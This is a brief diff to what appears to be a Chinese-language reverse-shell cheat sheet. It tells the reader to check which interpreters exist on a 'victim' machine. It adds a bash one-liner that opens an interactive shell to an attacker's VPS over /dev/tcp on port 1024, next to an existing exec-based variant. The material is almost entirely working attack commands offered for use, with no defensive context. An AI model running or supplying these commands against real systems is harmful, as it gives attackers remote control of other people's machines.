@@ -3,6 +3,9 @@
 受害机上执行：
 whereis bash nc python php exec perl ruby telnet
 
+用bash反弹shell：
+/bin/bash -i >& /dev/tcp/<your_vps>/1024 0>&1
+
 用exec反弹shell：
 0<&196;exec 196<>/dev/tcp/<your_vps>/1024; sh <&196 >&196 2>&196
 
